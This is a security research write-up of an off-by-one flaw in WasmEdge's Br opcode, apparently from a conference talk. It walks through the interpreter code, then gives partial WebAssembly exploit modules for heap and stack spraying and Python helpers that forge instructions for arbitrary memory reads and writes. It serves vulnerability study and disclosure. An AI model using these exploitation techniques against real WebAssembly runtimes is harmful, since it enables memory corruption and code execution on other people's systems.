# WasmEdge - Br Opcode Analysis and Off-by-One Vulnerability

## Overview
This document provides a detailed analysis of the `Br` (branch) opcode in WasmEdge, focusing on an off-by-one vulnerability. The vulnerability can be exploited to control the instruction pointer (`PC`) and potentially execute arbitrary code.

## Code Walkthrough

### Instruction Dispatch
The main loop iterates over instructions and dispatches them based on their opcodes:
```cpp
AST::InstrView::iterator PC = Start;
AST::InstrView::iterator PCEnd = End;

auto Dispatch = [this, &PC, &StoreMgr, &StackMgr]() -> Expect {
  const AST::Instruction &Instr = *PC;
  switch (Instr.getOpCode()) {
    // Other cases...
    case OpCode::Br:
      return runBrOp(StackMgr, Instr, PC);
    // Other cases...
  }
};

while (PC != PCEnd) {
  OpCode Code = PC->getOpCode();
  // Other operations...

  if (auto Res = Dispatch(); !Res) {
    return Unexpect(Res);
  }
  PC++;
}
```

### Branching Operation
The `runBrOp` function handles the `Br` opcode by calling `branchToLabel`:
```cpp
Expect Executor::runBrOp(Runtime::StackManager &StackMgr,
                         const AST::Instruction &Instr,
                         AST::InstrView::iterator &PC) noexcept {
  return branchToLabel(StackMgr, Instr.getJump().StackEraseBegin,
                       Instr.getJump().StackEraseEnd, Instr.getJump().PCOffset,
                       PC);
}
```

### Branch to Label
The `branchToLabel` function updates the `PC` based on the `PCOffset`:
```cpp
Expect Executor::branchToLabel(Runtime::StackManager &StackMgr,
                               uint32_t EraseBegin, uint32_t EraseEnd,
                               int32_t PCOffset,
                               AST::InstrView::iterator &PC) noexcept {
  // Check stop token
  if (unlikely(StopToken.exchange(0, std::memory_order_relaxed))) {
    spdlog::error(ErrCode::Interrupted);
    return Unexpect(ErrCode::Interrupted);
  }

  StackMgr.stackErase(EraseBegin, EraseEnd);
  PC += PCOffset;
  return {};
}
```

### Calculating `PCOffset`
The `PCOffset` is calculated during the instruction check:
```cpp
Expect FormChecker::checkInstr(const AST::Instruction &Instr) {
  // Other cases...
  switch (Instr.getOpCode()) {
    // Other cases...
    case OpCode::Br:
      if (auto D = checkCtrlStackDepth(Instr.getTargetIndex()); !D) {
        return Unexpect(D);
      } else {
        auto &Jump = const_cast<AST::Instruction&>(Instr).getJump();
        Jump.PCOffset = static_cast<int32_t>(CtrlStack[*D].Jump - &Instr);
        return unreachable();
      }
    // Other cases...
  }
}
```

## Exploitation
### Off-by-One Vulnerability
The off-by-one vulnerability in the `Br` opcode can be exploited by carefully crafting the `PCOffset` value. This can lead to the execution of unintended instructions.

### Example Module
```wasm
(module
  (type (;0;) (func))
  (func (;0;) (type 0)
    call 1
  )
  (func (;1;) (type 0)
     br 0
  )
  (export "_start" (func 0))
)
```
In this example, `PCOffset` is set to 1, leading to an off-by-one error:
```cpp
PC += 1;
```

### Heap Spray with `i64.const`
To exploit the vulnerability, we can use `i64.const` to spray the heap with controlled values:
```wasm
(module
  (type (;0;) (func))
  (global (;0;) i64 (i64.const 0x61626364))
  (func $_a(;1;) (type 0)
     i64.const 0x11111111
     i64.const 0x111111111
     i64.const 0x211111111
     i64.const 0x311111111
     ......
     i64.const 0xn11111111
     nop
     call $_b
     drop
     drop
     drop
     drop
     ......
     drop
  )
  (func $_b(;2;) (type 0)
     br 0
  )
  (func $_start(;0;) (type 0)
    ......
    call $_a
    ......
  )
  (export "_start" (func $_start))
  (memory (;0;) 1)
)
```

### Balancing the Stack
To balance the stack, we can use `v128.const` to spray the stack with controlled values:
```wasm
(module
  (type (;0;) (func))
  (global (;0;) i64 (i64.const 0x61626364))
  (func $_a(;1;) (type 0)
     ......
     call $_b
     ......
  )
  (func $_b(;2;) (type 0)
     br 0
  )
  (func $_start(;0;) (type 0)
        nop
        v128.const i64x2 0xffffffff 0xffffffff
        nop
        v128.const i64x2 0x1ffffffff 0x1ffffffff
        ......
        nop
        v128.const i64x2 0xnffffffff 0xnffffffff
        call $_a
        drop
        drop
        ......
        drop
        ......
  )
  (export "_start" (func $_start))
  (memory (;0;) 1)
)
```

### Fake Instructions
We can fake global get and set instructions to read and write arbitrary addresses:
```python
def Global_Get(index):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (index)
   code += 'nop\n'
   code += 'v128.const i64x2 0x2300000000 0\n'
   return code

def Global_Set(index):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (index)
   code += 'nop\n'
   code += 'v128.const i64x2 0x2400000000 0\n'
   return code

def i32_const(value):
   global i
   i += 2
   code = 'nop\n'
   code += 'v128.const i64x2 %d 0\n' % (value)
   code += 'nop\n'
   code += 'v128.const i64x2 0x4100000000 0\n'
   return code
```

## Conclusion
- **Structured Fuzzing**: Inspired by FREEDOM: Engineering a State-of-the-Art DOM Fuzzer (ACM CSS 2020).
- **Control PC Stack**: Use `i32.const`, `i64.const`, and `v128.const` for heap and stack spraying.
- **Global Get & Set**: Fake these instructions to read and write arbitrary addresses.

## Q&A
**Q1: Can we fuzz WebAssembly in V8 and other JS engines?**
- Yes, similar techniques can be applied to other JavaScript engines that support WebAssembly.

## Thanks
- TianYu Lab
- GitHub: [ha1vk/blackhat_wasm](https://github.com/ha1vk/blackhat_wasm)

---

This document provides a comprehensive overview of the `Br` opcode vulnerability in WasmEdge and how it can be exploited.